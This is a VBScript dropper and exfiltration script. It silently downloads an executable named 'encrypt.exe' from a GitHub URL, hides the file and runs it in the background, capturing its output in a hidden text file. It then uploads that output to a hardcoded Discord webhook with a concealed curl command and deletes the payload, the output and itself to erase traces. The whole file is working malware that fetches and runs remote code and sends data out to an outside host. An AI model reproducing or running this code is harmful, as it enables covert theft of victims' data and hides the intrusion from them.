Option Explicit

Dim objWinHTTP, objFSO, objFile, objShell
Dim url, localFilePath, strScriptPath, strBatPath

' URL of the file to download
url = "https://raw.githubusercontent.com/Sap196/PWS_new/main/encrypt.exe"

' Local path where the file will be saved
localFilePath = "encrypt.exe"

' Get the path of the script
strScriptPath = WScript.ScriptFullName

' Specify the path of the bat file
strBatPath = "encrypt.exe"

' Create a WinHTTP object
Set objWinHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
objWinHTTP.Open "GET", url, False
objWinHTTP.Send

' Check if the request was successful (status code 200)
If objWinHTTP.Status = 200 Then
    ' Create a FileSystemObject to write the file
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(localFilePath, True)

    ' Write the downloaded content to the file
    objFile.Write objWinHTTP.ResponseText

    ' Close the file
    objFile.Close
    Set objFile = objFSO.GetFile(localFilePath)
    objFile.Attributes = objFile.Attributes + 2  ' Add the Hidden attribute
End If

' Run the downloaded batch file
Set objShell = CreateObject("WScript.Shell")
objShell.Run "encrypt.exe > output.txt", 0, False
Set objShell = Nothing
SetAttr "output.txt", vbHidden

WScript.Sleep 10000

Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")

' Discord webhook URL
Dim discordWebhook
discordWebhook = "https://discord.com/api/webhooks/1202328029196730398/24xNitV8WYbF4qUql5MncBzaVeyDJfvAwLOsSdU8yPl17R4mwT8Juyo9TWGqi2FEfYBL"

' Construct the cURL command
Dim curlCommand
curlCommand = "curl -i -X POST -H ""Content-Type: multipart/form-data"" -F ""file=@output.txt"" " & discordWebhook

' Display the cURL command
WScript.Echo "Sending cURL command: " & curlCommand

' Run the cURL command
objShell.Run curlCommand, 0, True

' Clean up
Set objShell = Nothing

' Delete the script file
Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Specify the files to be deleted
Dim filesToDelete
filesToDelete = Array("output.txt", "encrypt.exe", WScript.ScriptFullName)

' Delete each file
For Each file In filesToDelete
    If objFSO.FileExists(file) Then
        ' Unhide the file before deleting
        SetAttr file, vbNormal
        ' Delete the file
        objFSO.DeleteFile file
    End If
Next

' Clean up
Set objFSO = Nothing
